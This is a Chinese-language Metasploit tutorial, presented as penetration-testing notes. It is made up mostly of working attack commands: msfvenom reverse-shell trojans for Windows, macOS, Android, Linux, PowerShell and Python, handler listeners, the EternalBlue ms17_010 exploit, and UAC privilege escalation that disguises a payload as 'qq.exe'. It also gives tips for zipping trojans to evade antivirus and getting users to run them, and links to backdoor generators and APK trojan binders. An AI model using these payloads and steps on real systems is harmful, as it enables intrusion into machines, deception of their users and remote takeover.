# 渗透测试基础09

# MSF框架以及使用（metasploit、armitage、命令行使用msf（Windows的漏洞）、利用漏洞永恒之蓝ms17_010、msf内网渗透生成各类木马、meterpreter操作（UAC提权和绕过提权）、GitHub上的相关工具（安卓相关：后门生成器、捆绑安卓木马、攻击框架））

使用工具：新版kali、bitvise+Windows虚拟机

**msf**

**metasploit**



## metasploit

msf其实就是一个攻击框架，几乎所有工具都是开源的，会编程的话可以自己做一个修改

armitage是msf的一个图形界面

### 打开armitage使用步骤

```
msfdb init
#初始化msf数据库
armitage
默认连接connect，yes
```

### 使用命令行

```
sudo su进入root权限
```

```
msfconsole
# 进入metasploit里面

use exploit/multi/handler
#准备监听某个木马
set payload windows/meterpreter/reverse_tcp
show options
set LHOST 192.168.1.104
set LPORT 3707
exploit
# 此时就完成了下文图形化界面中使用某payload攻击载荷木马监听windows主机的操作

如果有杀毒软件，可以试试把木马压缩一下之后再发送
zip -r 压缩文件名 木马程序名

用户双击木马运行了之后，就可以在图形化界面看到木马上线

用命令行配置木马：（不同操作系统命令不一样）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.104 LPORT=3707 -f exe > shell.exe
zip -r shell.rar shell.exe
然后用bitvise ssh client软件将其压缩文件发到目标电脑上即可测试使用
use exploit/multi/handler
#准备监听某个木马
set payload windows/x64/meterpreter/reverse_tcp
show options
set LHOST 192.168.1.104
set LPORT 4444
exploit
sessions -i 1   #进入控制该木马
然后即可进行一些操作比如mkdir等
```

### 图形化界面使用（缺点：慢）

```
打开armitage后

Hosts栏：

Nmap Scan可以看到各种扫描方式进行扫描

比如ping scan
输入要扫描的网段比如192,168,1,0/24得到一系列主机
对某主机点击右键， 选择scan即可对该主机进行一个精细化扫描
右键，选择Host也可以对其进行一个标签或者标记备注

Attack栏等

左边exploit就是一些漏洞

payload就是一些攻击载荷：
比如windows→一般用meterpreter打→reverse_tcp→双击打开可以给你生成一个东西→output栏指定生成类型（multi/handler-监听，exe-程序等）→端口需要一样，记录端口lport=3707→lunch生成程序后save保存到某文件夹→在主机运用bitvise ssh client软件点击New SFTP window连接→可以看见kali文件里有刚刚生成的程序→下载到主机→相当于一个木马程序→可以和命令行联合使用进行操作
→看见木马上线后就可以在右键meterpreter1里看到一些可以进行的操作
```



## **metasploit2**

实质：攻击框架

新版kali、bitvise

### 简单利用漏洞操作

```
msfconsole  #打开msf
```

可以调用nmap

```
nmap -sV [目标ip]
#查看大致情况
```

本次使用漏洞：**永恒之蓝 ——漏洞编号：ms17_010**

Windows7-10等



**msf如果去攻击对方需要条件**：
1.漏洞
2.攻击载荷（木马，病毒）



```
#msf console里：
use exploit #查看漏洞

use exploit/windows/smb/ms17_010_eternalblue
#使用该漏洞

show options
set RHOSTS [目标ip]
#如下图

run 运行
#运行成功后即拿到了对方电脑的控制权
```

![image-20220109225153371](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220109225153371.png)

```
exit  #退出
```



## msf内网渗透：

### 生成exe木马：

```
sudo su  #进入root权限目录

msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_tcp LHOST=[自己ip] LPORT=4444 -b "\00" -e x86/shikata_ga_nai -f exe > msf.exe
# 在目标电脑上生成一个exe木马，可下载下来发给被控制人
# 攻击载荷windows/meterpreter/reverse_tcp

# 在msf里建立木马控制端：
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp   # 设置攻击载荷
set LHOST [自己ip]
exploit # 进入监听状态
# 此时如果有木马启动，就会连接我

background   # 暂时不操作，把木马放到后台
sessions     # 查看控制了多少人
sessions -i 1   # 进入1号主机控制端
jobs      # 查看目前在执行多少任务
back      # 后退一格
exit  #退出木马，关闭木马
```



### 其他生成木马的命令：

生成mac木马：

```
msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=自己ip LPORT=4444 -f macho -o payload.macho

# 老版本的mac
```



生成android木马（需要数字签名）：

```
msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f apk -o payload.apk
```



生成powershell木马：

```
msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=自己ip LPORT=4444 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1
```



生成linux木马：

```
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f elf -o payload.elf
```



生成python木马：

```
msfvenom -p python/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f raw -o payload.py
```



## meterpreter操作：

```
sessions -i 1   # 进入1号主机控制端
```

### meterpreter操作：

#### **UAC提权**：

```
上述操作，生成木马并在msf里建立木马控制端，exploit
background   # 暂时不操作，把木马放到后台
back      # 后退一格

sessions -i 1   # 进入1号主机控制端

getuid   # 查看当前用户权限
getsystem   # 直接提权
（有风险，有可能会报错）

# 考虑使用ask模块去提权
background    # 先把木马放到后台
use exploit/windows/local/ask   # 加载ask模块
info    # 查看漏洞信息
set SESSION 1    # 使用漏洞在1号木马控制的目标上
set FILENAME qq.exe    # 伪装成qq
exploit
# 会在用户桌面上弹出一个允许qq启动，用户选择yes，成功

# 如果攻击成功，会给你一个新的session号
# 进入新的session号
getuid
getsystem
```

UAC权限

![image-20220109231015448](09 MSF框架以及使用.assets/image-20220109231015448.png)



#### UAC绕过提权（成功概率不高）：

```
use exploit/windows/local/bypassuac # (多用来进攻32位系统)
show options
set SESSION 1
exploit 开始攻击
# 如果攻击成功，会给你一个新的session号
# 进入新的session号
getuid
getsystem
```



## github相关工具使用

kali的root权限下利用msf：

安卓相关

https://github.com/Screetsec/TheFatRat

后门生成器



https://github.com/M4sc3r4n0/Evil-Droid

攻击框架



https://github.com/jbreed/apkinjector

捆绑安卓木马apk

